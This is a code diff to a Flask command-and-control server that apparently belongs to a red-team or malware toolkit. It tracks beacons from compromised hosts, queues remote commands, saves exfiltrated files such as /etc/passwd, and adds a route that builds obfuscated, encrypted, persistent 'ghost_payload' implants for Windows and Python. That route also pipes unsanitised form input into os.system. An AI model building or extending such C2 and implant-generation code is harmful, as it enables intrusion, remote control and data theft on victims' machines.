@@ -1,6 +1,7 @@
 import eventlet
 eventlet.monkey_patch()
 
+from flask import send_from_directory
 from flask import Flask, request, jsonify, render_template, redirect, session, url_for
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
 from flask_socketio import SocketIO, emit
@@ -9,7 +10,7 @@ import os
 import base64
 import json
 import sys
-from datetime import datetime
+from datetime import datetime, UTC
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
 from crypto import aes_decrypt, aes_encrypt
@@ -67,12 +68,59 @@ def logout():
 def dashboard():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT * FROM beacons ORDER BY timestamp DESC")
-    beacons = c.fetchall()
     c.execute("SELECT id, hostname, command, status, result FROM tasks ORDER BY id DESC")
     tasks = c.fetchall()
     conn.close()
-    return render_template("dashboard.html", beacons=beacons, tasks=tasks)
+    return render_template("dashboard.html", tasks=tasks)
+
+@app.route('/api/beacons', methods=['GET'])
+@login_required
+def get_beacons():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT hostname, ip, timestamp, payload FROM beacons ORDER BY timestamp DESC")
+    rows = c.fetchall()
+    conn.close()
+
+    beacons = []
+    for row in rows:
+        hostname, ip, timestamp, payload = row
+        try:
+            last_seen = datetime.fromisoformat(timestamp)
+            delta = (datetime.now(UTC) - last_seen).total_seconds()
+        except:
+            delta = 999999
+        beacons.append({
+            "hostname": hostname,
+            "ip": ip,
+            "last_seen_seconds": delta,
+            "payload": payload,
+            "timestamp": timestamp
+        })
+    return jsonify(beacons)
+
+@app.route('/api/beacon/<hostname>')
+@login_required
+def get_beacon_detail(hostname):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT ip, timestamp, payload FROM beacons WHERE hostname = ? ORDER BY timestamp DESC LIMIT 1", (hostname,))
+    row = c.fetchone()
+    if not row:
+        return jsonify({"error": "Beacon not found"}), 404
+
+    ip, timestamp, payload = row
+    c.execute("SELECT command, result FROM tasks WHERE hostname = ? ORDER BY id DESC LIMIT 10", (hostname,))
+    tasks = [{"command": cmd, "result": res} for cmd, res in c.fetchall()]
+    conn.close()
+
+    return jsonify({
+        "hostname": hostname,
+        "ip": ip,
+        "timestamp": timestamp,
+        "payload": payload,
+        "tasks": tasks
+    })
 
 @app.route('/add_task', methods=['POST'])
 @login_required
@@ -93,7 +141,6 @@ def add_task():
 def console():
     return render_template("console.html")
 
-
 @app.route('/console_data')
 def console_data():
     conn = sqlite3.connect(DB_PATH)
@@ -102,7 +149,6 @@ def console_data():
     hosts = [row[0] for row in c.fetchall()]
     conn.close()
     return jsonify({"hosts": hosts})
-
 
 @app.route('/console_send', methods=['POST'])
 @login_required
@@ -136,7 +182,7 @@ def beacon():
     ip = request.remote_addr
     hostname = data.get('hostname', 'unknown')
     payload = data.get('payload', 'none')
-    timestamp = datetime.utcnow().isoformat()
+    timestamp = datetime.now(UTC).isoformat()
 
     print(f"[+] Beacon received from {hostname} ({ip}) - Payload: {payload}")
 
@@ -150,14 +196,7 @@ def beacon():
     conn.close()
 
     commands = [cmd for _, cmd in tasks]
-
-    if commands:
-        print(f"[+] Queued tasks for {hostname}: {commands}")
-    else:
-        print(f"[-] No tasks queued for {hostname}")
-
     return jsonify({'tasks': commands}), 200
-
 
 @app.route('/result', methods=['POST'])
 def result():
@@ -167,37 +206,26 @@ def result():
     command = data.get("command")
     result = data.get("result")
 
-
     if result.startswith("[EXFIL:"):
         lines = result.splitlines()
-        header = lines[0]  # e.g., [EXFIL:/etc/passwd]
+        header = lines[0]
         b64data = "\n".join(lines[1:])
         filepath = header.split(":", 1)[1].strip().rstrip("]")
         filename = os.path.basename(filepath)
         decoded = base64.b64decode(b64data)
-
         outdir = os.path.join("downloads", hostname)
         os.makedirs(outdir, exist_ok=True)
-
         full_path = os.path.join(outdir, filename)
-        print(f"[DEBUG] Saving to: {full_path}")
         with open(full_path, "wb") as f:
             f.write(decoded)
-
         print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
-
-
 
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", 
-              (result, hostname, command))
+    c.execute("UPDATE tasks SET result = ? WHERE hostname = ? AND command = ? AND status = 'dispatched'", (result, hostname, command))
     conn.commit()
     conn.close()
 
-    print(f"[+] Result from {hostname}:\n{result}")
-
-    # ✅ Emit to the live console before the return
     socketio.emit("console_result", {
         "hostname": hostname,
         "command": command,
@@ -206,7 +234,62 @@ def result():
 
     return jsonify({"status": "result stored"})
 
+@app.route('/generate', methods=['GET', 'POST'])
+@login_required
+def generate():
+    if request.method == 'POST':
+        c2 = request.form.get('c2')
+        result = request.form.get('result')
+        format = request.form.get('format')
+        obfuscate = 'obfuscate' in request.form
+        persist = 'persist' in request.form
+        encrypt = 'encrypt' in request.form
 
+        timestamp = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
+        filename = f"ghost_payload_{timestamp}.{format}"
+        out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds', filename))
+
+        os.makedirs(os.path.dirname(out_path), exist_ok=True)
+
+        cmd = f"python3 ../tools/generate_payload.py --c2 {c2} --result {result}"
+
+        if format == "exe":
+            cmd += " --exe"
+        elif format == "bat":
+            cmd += " --bat"
+        elif format == "ps1":
+            cmd += " --ps1"
+        elif format == "py":
+            cmd += " --py"
+
+        if obfuscate:
+            cmd += " --obfuscate"
+        if encrypt:
+            cmd += " --encrypt"
+        if persist:
+            cmd += " --persist"
+
+        cmd += f" --output {out_path}"
+
+        print(f"[+] Running: {cmd}")
+        os.system(cmd)
+
+        return redirect(url_for('download_payload', filename=filename))
+
+    return render_template("generate.html")
+
+@app.route('/download/<filename>')
+@login_required
+def download_payload(filename):
+    builds_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'builds'))
+    full_path = os.path.join(builds_dir, filename)
+
+    if not os.path.isfile(full_path):
+        print(f"[!] File not found: {full_path}")
+        return f"File not found: {filename}", 404
+
+    print(f"[+] Serving: {full_path}")
+    return send_from_directory(builds_dir, filename, as_attachment=True)
 
 @socketio.on('connect')
 def handle_connect():
@@ -232,17 +315,13 @@ def handle_result(encrypted_data):
     conn.commit()
     conn.close()
 
-    print(f"[+] Result from {hostname}:\n{result}")
-
     emit("ack", aes_encrypt(json.dumps({"msg": "Result stored"})))
 
-    # ✅ Add this line so the live console sees it
     socketio.emit("console_result", {
         "hostname": hostname,
         "command": command,
         "result": result
     })
-
 
 @socketio.on('send_command')
 def handle_send_command(data):
@@ -256,9 +335,6 @@ def handle_send_command(data):
     c.execute("INSERT INTO tasks (hostname, command, status, result) VALUES (?, ?, 'pending', '')", (hostname, command))
     conn.commit()
     conn.close()
-
-    print(f"[+] Queued task for {hostname}: {command}")
-
 
 @socketio.on('request_task')
 def handle_task_request(encrypted_data):
